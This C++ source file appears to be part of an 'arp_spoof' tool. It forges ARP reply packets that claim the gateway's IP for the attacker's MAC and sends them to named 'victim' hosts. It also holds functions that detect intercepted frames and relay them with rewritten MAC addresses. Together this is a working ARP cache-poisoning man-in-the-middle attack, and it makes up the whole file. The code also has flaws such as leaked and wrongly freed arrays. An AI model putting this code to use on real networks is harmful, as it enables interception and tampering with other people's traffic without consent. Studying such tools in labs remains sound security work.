#include "spoof.h"

using namespace std;

void usage(){
    cout << "Usage: " << endl 
        << "arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]" << endl << endl;
}

// convert string ip to uint8_t*
uint8_t* parseIP(const char* ip) {
    u_char* ret = new u_char[4]{0, };
    for (size_t i = 0; i < strlen(ip); i++){
        if(*(ip+i) == '.'){
            ret++;
        }else{
            *ret *= 10;
            *ret += *(ip+i) - '0';
        }
    }
    return ret - 3;
}

// set mac addr in data
void setMac(session* data){
    if(!memcmp(data->sender_ip, myIp, 4))
        memcpy(data->sender_mac, myMac, 6);
    else
        getMac(data->sender_ip, data->sender_mac);
    if(!memcmp(data->target_ip, myIp, 4))
        memcpy(data->target_mac, myMac, 6);
    else
        getMac(data->target_ip, data->target_mac);
}

// get mac addr by ip
void getMac(uint8_t* ip, uint8_t* macPtr){
    etherHeader* eth = new etherHeader;
    arpHeader* arp = new arpHeader;
    session* data = new session;
    memcpy(data->sender_mac, myMac, 6);
    memcpy(data->sender_ip, myIp, 4);
    memcpy(data->target_ip, ip, 4);
    memcpy(data->target_mac, "\x00\x00\x00\x00\x00\x00", 6);
    setARPPacketHeaders(eth, arp, data);
    arp->opcode = ntohs(1);                                 // change to arp request
    u_char* arpPacket = makeARPPacket(eth, arp);
    pcap_sendpacket(handle, arpPacket, 42);
    delete arpPacket;
    for (int i = 0; i < 1000; i++) {
        struct pcap_pkthdr* header;
        const uint8_t* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        const etherHeader* getEth = reinterpret_cast<const etherHeader*>(packet);
        if(ntohs(getEth->ether_type) == 0x0806){
            const arpHeader* getArp = reinterpret_cast<const arpHeader*>(packet + 14);
            if(!memcmp(getArp->sender_ip, data->target_ip, 4)){
                memcpy(macPtr, getArp->sender_mac, 6);
            }
        }
    }
    delete eth;
    delete arp;
    delete data;
}

// union eth header and arp header
uint8_t* makeARPPacket(etherHeader* eth, arpHeader* arp){
    u_char* ret = new u_char[42];
    memcpy(ret, eth, 14);
    memcpy(ret+14, arp, 28);
    return ret;
}

// set my mac
void setMyMac(){
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);
    memcpy(myMac, ifr.ifr_hwaddr.sa_data, 6);
}

// set my ip
void setMyIP(){
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);
    memcpy(myIp, parseIP(inet_ntoa((reinterpret_cast<struct sockaddr_in *>(&ifr.ifr_addr))->sin_addr)), 4);
}

// set data of ethernet, arp header by session
void setARPPacketHeaders(etherHeader* eth, arpHeader* arp, session* data){
    memcpy(eth->dMac, "\xff\xff\xff\xff\xff\xff", 6);       // to broadcast
    memcpy(eth->sMac, myMac, 6);                            // from me
    eth->ether_type = ntohs(0x0806);                        // arp protocol

    arp->hw_type = ntohs(1);
    arp->protocol = ntohs(0x0800);
    arp->hw_size = 6;
    arp->protocol_size = 4;
    arp->opcode = ntohs(2);
    memcpy(arp->sender_mac, eth->sMac, 6);                              // my mac
    memcpy(arp->sender_ip, data->sender_ip, 4);                       // gateway ip
    memcpy(arp->target_mac, data->target_mac, 6);                     // victim mac
    memcpy(arp->target_ip, data->target_ip, 4);                       // victim ip
}
void dumpPacket(uint8_t* packet, size_t length){
    for(size_t i = 0; i < length; i++){
        if(i != 1 && i % 16 == 0)
            cout << endl;
        else if(i != 1 && i % 8 == 0)
            cout << "  ";
        printf("%02x ", *(packet + i));
    }
    cout << endl;
}

void dumpPacket(const uint8_t* packet, size_t length){
    for(size_t i = 0; i < length; i++){
        if(i != 1 && i % 16 == 0)
            cout << endl;
        else if(i != 1 && i % 8 == 0)
            cout << "  ";
        printf("%02x ", *(packet + i));
    }
    cout << endl;
}

bool hasToRelay(session* data, const uint8_t* packet){
    const etherHeader* eth = reinterpret_cast<const etherHeader*>(packet);
    if(!memcmp(eth->dMac, myMac, 6) && !memcmp(eth->sMac, data->target_mac, 6) && eth->ether_type != ntohs(0x0806))
        return true;
    return false;
}

uint8_t* relayPacket(session* data, const uint8_t* packet, size_t len){
    uint8_t* ret = new uint8_t[len];
    memcpy(ret, packet, len);
    etherHeader* eth = reinterpret_cast<etherHeader*>(ret);
    memcpy(eth->dMac, data->sender_mac, 6);
    memcpy(eth->sMac, myMac, 6);
    return ret;
}
